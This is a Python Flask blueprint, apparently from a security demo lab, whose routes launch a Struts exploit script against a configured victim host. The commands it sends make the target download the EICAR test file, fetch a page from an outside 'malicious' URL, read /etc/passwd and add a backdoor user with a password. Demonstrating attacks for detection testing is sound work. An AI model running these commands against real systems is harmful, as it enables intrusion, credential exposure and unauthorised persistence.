from flask import render_template, Blueprint, flash, redirect, url_for, current_app
import subprocess, os

###################################################################################
# NOTES:
#
# If using Dockerfile, the python path will need to be changed to /usr/local/bin/python
#
# Need to dynamically read in the value for "victim_host"
#
###################################################################################
victim_host = ''
with open ("VICTIM_HOST.txt", "r") as configfile:
    victim_host = configfile.read().replace('\n', '')

#victim_host = os.environ['VICTIM_HOST'] # This environment variable is set via the terraform aws_instance.bastion_host provisioner script.
struts_port = ''
with open ("STRUTS_PORT.txt", "r") as configfile:
    struts_port = configfile.read().replace('\n', '')

#struts_port = os.environ['STRUTS_PORT'] # This environment variable is set via the terraform asws_instance.bstion_host provisioner script.

main_blueprint = Blueprint(
    'main',
    __name__,
    template_folder='../templates/main'
)

def format_output(output):
    print(type(output))
    if (isinstance(output, str)):
        return output
    else:
        return str(output.decode("utf-8"))

@main_blueprint.route('/')
def home():
    return render_template('index.html', victim_host=victim_host)


@main_blueprint.route('/ping') 
def ping():
    #output = "fake output"
    try:
        output = subprocess.check_output(["ping", "-c", "1", "8.8.8.8"])
        flash("The command ran successfully", category="success")
    except subprocess.CalledProcessError as e:
        flash("An error occurred", category="danger")
        output = "An error occurred:\n {e}".format(e=e)
    return render_template('struts.html', output=format_output(output))


@main_blueprint.route('/ping_target') 
def ping_target():
    #output = "fake output"
    try:
        output = subprocess.check_output(["ping", "-c", "1", victim_host])
        flash("The command ran successfully", category="success")
    except subprocess.CalledProcessError as e:
        flash("An error occurred", category="danger")
        output = "An error occurred:\n {e}".format(e=e)
    return render_template('struts.html', output=format_output(output))


@main_blueprint.route('/curl_target')
def curl_target():
    #output = "fake output"
    try:
        target_url = "{victim_host}:{struts_port}/cmd.exe".format(victim_host=victim_host, struts_port=struts_port)
        output = subprocess.check_output(["curl", "-m", "2", target_url])
        flash("The command ran successfully", category="success")
    except subprocess.CalledProcessError as e:
        flash("An error occurred", category="danger")
        output = "An error occurred:\n {e}".format(e=e)
    return render_template('struts.html', output=format_output(output))


@main_blueprint.route('/cmd_exe') 
def cmd_exe():
    #output = "fake output"
    try:
        target_url = "{victim_host}:{struts_port}/cmd.exe".format(victim_host=victim_host, struts_port=struts_port)
        output = subprocess.check_output(["curl", target_url])
        flash("The command ran successfully", category="success")
    except subprocess.CalledProcessError as e:
        flash("An error occurred", category="danger")
        output = "An error occurred:\n {e}".format(e=e)
    return render_template('struts.html', output=format_output(output))


@main_blueprint.route('/struts_eicar') 
def struts_eicar():
    #output = "fake output"
    try:
        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:{struts_port}/hello".format(victim_host=victim_host, struts_port=struts_port), "wget http://www.eicar.org/download/eicar.com -O /tmp/eicar.com"])
        flash("The command ran successfully", category="success")
    except subprocess.CalledProcessError as e:
        flash("An error occurred", category="danger")
        output = "An error occurred:\n {e}".format(e=e)
    return render_template('struts.html', output=format_output(output))


@main_blueprint.route('/struts_eicar_https') 
def struts_eicar_https():
    #output = "fake output"
    try:
        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:{struts_port}/hello".format(victim_host=victim_host, struts_port=struts_port), "apk add --update openssl; wget https://secure.eicar.org/eicar.com -O /tmp/eicar.com"])
        flash("The command ran successfully", category="success")
    except subprocess.CalledProcessError as e:
        flash("An error occurred", category="danger")
        output = "An error occurred:\n {e}".format(e=e)
    return render_template('struts.html', output=format_output(output))


@main_blueprint.route('/struts_mal_url') 
def struts_mal_url():
    #output = "fake output"
    try:
        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:{struts_port}/hello".format(victim_host=victim_host, struts_port=struts_port), "wget http://wrs21.winshipway.com -O index.html"])
        flash("The command ran successfully", category="success")
    except subprocess.CalledProcessError as e:
        flash("An error occurred", category="danger")
        output = "An error occurred:\n {e}".format(e=e)
    return render_template('struts.html', output=format_output(output))



@main_blueprint.route('/struts_list_users') 
def struts_list_users():
    #output = "fake output"
    try:
        target = "http://{victim_host}:{struts_port}/hello".format(victim_host=victim_host, struts_port=struts_port)
        output = subprocess.check_output(["/usr/bin/python", "exploit.py", target, "cat /etc/passwd"])
        flash("The command ran successfully", category="success")
    except subprocess.CalledProcessError as e:
        flash("An error occurred", category="danger")
        output = "An error occurred:\n {e}".format(e=e)
    return render_template('struts.html', output=format_output(output))



@main_blueprint.route('/struts_create_user') 
def struts_create_user():
    #output = "fake output"
    try:
        output = subprocess.check_output(["/usr/bin/python", "exploit.py", "http://{victim_host}:{struts_port}/hello".format(victim_host=victim_host, struts_port=struts_port), 'adduser -D badguy; echo "badguy:newpass" | chpasswd'])
        flash("The command ran successfully", category="success")
    except subprocess.CalledProcessError as e:
        flash("An error occurred", category="danger")
        output = "An error occurred:\n {e}".format(e=e)
    return render_template('struts.html', output=format_output(output))





    
